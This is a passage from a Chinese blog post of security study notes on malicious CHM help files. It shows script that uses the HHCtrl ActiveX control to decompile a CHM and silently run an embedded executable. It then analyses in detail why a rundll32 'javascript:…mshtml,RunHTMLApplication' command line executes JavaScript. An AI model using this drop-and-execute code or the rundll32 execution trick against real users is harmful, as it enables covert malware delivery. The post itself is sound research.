 </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="comment">&lt;!--&gt;判断文件是否存在，存在就执行指定的文件。&lt;--&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">function isHasFile()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	var a,s=&#x27;C:\\Windows\\Temp\\Downloads\\Test7Z1.exe&#x27;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	a = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	if(a.FileExists(s))</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		AUTO.Click();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">var dir = getPath();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// ``为模板字符串，即输入啥样，输出啥样</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">var commodStr = </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">unrar</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span> </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,hh, -decompile C:\\Windows\\Temp\\Downloads\\ </span></span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml"><span class="language-handlebars">	` + dir + </span></span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml"><span class="language-handlebars">    `</span></span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml"><span class="language-handlebars">    	&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">AUTO</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,C:\\Windows\\Temp\\Downloads\\Test7Z1.exe&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    `;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">document.getElementById(&#x27;t0&#x27;).innerHTML = commodStr;  </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">unrar.Click();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">isHasFile();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x03-为什么rundll32-exe能执行js代码"><a href="#0x03-为什么rundll32-exe能执行js代码" class="headerlink" title="0x03 为什么rundll32.exe能执行js代码"></a>0x03 为什么rundll32.exe能执行js代码</h2><p>​    Rundll32的作用是执行DLL文件中的内部函数。命令行格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUNDLL32.EXE &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional arguments&gt;</span><br></pre></td></tr></table></figure>
+<p>​    EntryPoint就是要执行的内部函数，他的原型如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);</span><br></pre></td></tr></table></figure>
+<p>​    经过分析，Rundll32首先要调用ParseCommand函数把传进来的参数分割，函数会搜索逗号(‘,’, 0x2C)来定位dllname，搜索空格(‘ ‘, 0x20)来定位entrypoint。</p>
+<p>​    当输入：<code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;alert(&#39;foo&#39;);</code>时，ParseCommand将<code>dllname=javascript:&quot;\..\mshtml</code>，<code>entrypoint=RunHTMLApplication</code>。</p>
+<p>​    之后，Rundll32会试图读取名称为<code>javascript:&quot;\..\mshtml</code>的DLL。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 首先，系统尝试调用GetFileAttributes(&quot;javascript:&quot;\..\mshtml&quot;)读取文件，最终会访问到C:\Windows\system32\mshtml（cmd的路径为C:\Windows\system32），但是文件不存在，所以函数返回-1。（为啥？试一试就知道了，见附录1）</span><br><span class="line">2. 然后，系统调用SearchPath来寻找DLL名称。SearchPath会读取注册表中HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\SafeProcessSearchMode的键值，来决定先搜索当前工作目录，还是先搜索系统路径。</span><br><span class="line">3. 如果还查不到，系统就会再次使用GetFileAttributes，来查找C:\Windows\system32\mshtml.manifest。</span><br><span class="line">3. 很显然，都搜索不到。最终，Rundll32会调用LoadLibrary函数，它会调用LoadLibrary(&quot;javascript:&quot;..\mshtml.dll&quot;)，并将其作为dll来加载，因此，他想找上一级目录的mshtml.dll，这是可以找到的。</span><br><span class="line">4. Rundll32 调用 mshtml.dll!RunHTMLApplication 函数。</span><br></pre></td></tr></table></figure>
+<p>​    RunHTMLApplication函数原型是这样的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HRESULT <span class="title function_">RunHTMLApplication</span><span class="params">(</span></span><br><span class="line"><span class="params">    HINSTANCE hinst,</span></span><br><span class="line"><span class="params">    HINSTANCE hPrevInst,</span></span><br><span class="line"><span class="params">    LPSTR szCmdLine,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> nCmdShow</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">// 与 EntryPoint 比较：</span></span><br><span class="line"><span class="comment">// 可以看到 EntryPoint 与 RunHTMLApplication 很相似。</span></span><br><span class="line"><span class="comment">// 不同的是，RunHTMLApplication的第 1 个参数接受 1 个窗口句柄而不是模块句柄，该参数用于mshtml注册新窗口类并创建窗口，传一个非实例的参数貌似也不会有啥问题。</span></span><br><span class="line"><span class="comment">// 第 2 个参数并未被用到，即使不匹配也没啥事。</span></span><br><span class="line"><span class="comment">// 第 4 个参数nCmdShow由于指定RunHTMLApplication是否显示HTML应用的窗口。Rundll32调用入口的时候总是传入SW_SHOWDEFAULT来显示窗口到默认位置。</span></span><br><span class="line"><span class="type">void</span> CALLBACK <span class="title function_">EntryPoint</span><span class="params">(</span></span><br><span class="line"><span class="params">    HWND hwnd,</span></span><br><span class="line"><span class="params">    HINSTANCE hinst,</span></span><br><span class="line"><span class="params">    LPSTR lpszCmdLine,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> nCmdShow</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+<p>​    我们主要关心的参数是第 3 个参数 lpszCmdLine，这里传入的应该是<code>&quot;;alert(&#39;foo&#39;)</code>。很明显，这不是一个合法的JavaScript语句（末尾缺失双引号）。但本例中却是有效的，<strong>因为RunHTMLApplication会忽略该参数，而调用API GetCommandLine（包装在GetCmdLine函数中）来获取参数。</strong>如下图所示：</p>
+<p><img src="/images/chm-study-notes/image-20221208214403168.png" alt="image-20221208214403168" style="zoom:67%;" /></p>
+<p>​    完整的命令行包含可执行文件的名字和参数，GetCmdLine会去掉可自行文件名，提取出参数：（<strong>这里不理解的一点是，为啥GetCmdLine会重新解析<code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;alert(&#39;foo&#39;);</code></strong>）</p>
+<p><img src="/images/chm-study-notes/image-20221208214559572.png" alt="image-20221208214559572" style="zoom:67%;" /></p>
+<p>​    然后，RunHTMLApplication 会调用CreateUrlMoniker(<strong>为啥？上图汇编中没有体现啊？</strong>)。CreateUrlMoniker解析命令行并提取出”:”之前的字符串，即<code>javascript</code>：</p>
+<p><img src="/images/chm-study-notes/image-20221208214826301.png" alt="image-20221208214826301" style="zoom:67%;" /></p>
+<p>​    之后，CreateUrlMoniker会读取注册表HKCR\SOFTWARE\Classes\PROTOCOLS\Handler\ 中的值，其中存储了协议和其对应的CLSID（<strong>class identifier（类标识符）也称为CLASSID或CLSID，是与某一个类对象相联系的唯一标记(UUID)。一个准备创建多个对象的类对象应将其CLSID注册到系统注册数据库的任务表中，以使客户能够定位并装载与该对象有关的可执行代码</strong>）。CreateUrlMoniker会为JavaScript寻找合适的协议处理器。</p>
+<p>​    之后，javascript会解析：<code>&quot;..\mshtml,RunHTMLApplication &quot;;alert(&#39;foo&#39;);</code>。</p>
+<p>​    这是一段合法的JavaScript，包含一个字符串<code>&quot;..\mshtml,RunHTMLApplication&quot;</code>（包括之前被忽略过的双引号）和一个函数(alert)。</p>
+<h2 id="0x04-附录1"><a href="#0x04-附录1" class="headerlink" title="0x04 附录1"></a>0x04 附录1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getFileAttr</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 要查询的文件的路径</span></span><br><span class="line">    <span class="comment">// const char *filePath = &quot;C:\\Windows\\explorer.exe&quot;;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *filePath = <span class="string">&quot;javascript:\&quot;\\..\\easyCpp.cpp&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 GetFileAttributesA 函数获取文件属性</span></span><br><span class="line">    DWORD fileAttributes = GetFileAttributesA(filePath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果调用成功，fileAttributes 会包含文件的属性。</span></span><br><span class="line">    <span class="comment">// 可以使用一些宏来检查它们，例如 FILE_ATTRIBUTE_DIRECTORY 来检查文件是否是目录。</span></span><br><span class="line">    <span class="keyword">if</span> (fileAttributes != INVALID_FILE_ATTRIBUTES)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;File attributes: 0x%x\n&quot;</span>, fileAttributes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果调用失败，GetLastError 函数可以获取错误代码。</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetFileAttributesA failed with error code %d\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​    <code>getFileAttr</code>与<code>easyCpp.cpp</code>在同一个目录下，函数输出<code>File attributes: 0x20</code>，说明确实能找到。</p>
+
+  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/2022/12/10/z3-study/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2022/12/04/mfc-study/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+
+
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    <!-- 
+    <div id="disqus_thread" class="ds-thread">
+        <script type="text/javascript">
+            /**
+             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+             */
+                /*
+                 var disqus_config = function () {
+                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                 };
+                 */
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+
+                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
+                Disqus.</a></noscript>
+    </div> -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
+            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
+        })
+    </script>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-12-08 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/study-notes/">study-notes<span>17</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+
+	<!-- copyright -->
+	<div>
+    <ul class="post-copyright">
+      <li class="post-copyright-author">
+      <strong>作者:  </strong>wd-z711</a>
+      </li>
+      <li class="post-copyright-link">
+      <strong>文章链接:  </strong>
+      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明:   </strong>
+        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+        许可协议。转载请注明出处!
+      </li>
+    </ul>
+  <div>
+ 	
+
+		
+
+
+</div><!-- row -->
+
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2023 wd-z711
+  
+      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->
+
+     <!-- <script type="text/javascript">
+      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+      
+      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
+    </script> -->
+    </p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+   </html>
